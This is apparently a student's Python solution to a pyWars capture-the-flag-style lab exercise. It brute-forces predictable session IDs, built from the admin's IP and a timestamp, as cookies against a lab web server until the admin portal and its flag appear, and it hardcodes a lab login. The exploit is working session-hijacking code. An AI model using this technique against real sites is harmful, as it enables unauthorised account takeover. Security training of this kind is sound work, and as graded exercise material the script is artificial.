'''

'POINTS:8,TIMED:N - Use session hijacking to access the administrator portal.  To begin read the URL of the target website from the data element. '
>>> game.data(9)
'http://10.10.10.40/sessions.php'


console.log(document.cookie)
session_id=10.10.76.1-01.10.2020-00.47.02

Last Successful login: Admin@10.1.148.12

Current server date :01.10.2020
Current server time :00:47:2 EASTERN TIME ZONE


'''

import pyWars
import requests
import re
import io
import time

game = pyWars.exercise()
game.login("mleigh","N0Passw0rd")
    

def answer(data):
    url = data
    s = requests.Session()
    r = s.get(url)
    srv_date = '01.12.2020'
    #srv_time = '00.47.02'
    #for date in range(1):
    hour =7
    for hour in range(10):
        for minute in range(60):
             for sec in range(60):
                srv_time = "{:02d}".format(hour) + "." + "{:02d}".format(minute) + "." + "{:02d}".format(sec)
                #session_id = '10.1.148.12-01.'+"{:02d}".format(date)+'.2020-'+srv_time
                session_id = '10.1.148.12-'+srv_date+"-"+srv_time
                mycookie = {'session_id':session_id}
                if url == 'http://10.10.10.40/sessions.php':
                    s.cookies.set(domain='10.10.10.40',name='session_id',value=session_id)
                else:
                    s.cookies.set(domain='10.10.10.20',name='session_id',value=session_id)
                print(session_id)
                print(s.cookies.get_dict())
                time.sleep(.01)
                r = s.get(url)
                if "Please enter your username and password to continue" not in r.text:
                    print(r.text)
                    flag = r.text.split("=")
                    return flag[1]
        


print(game.answer(9,answer(game.data(9))))
game.logout
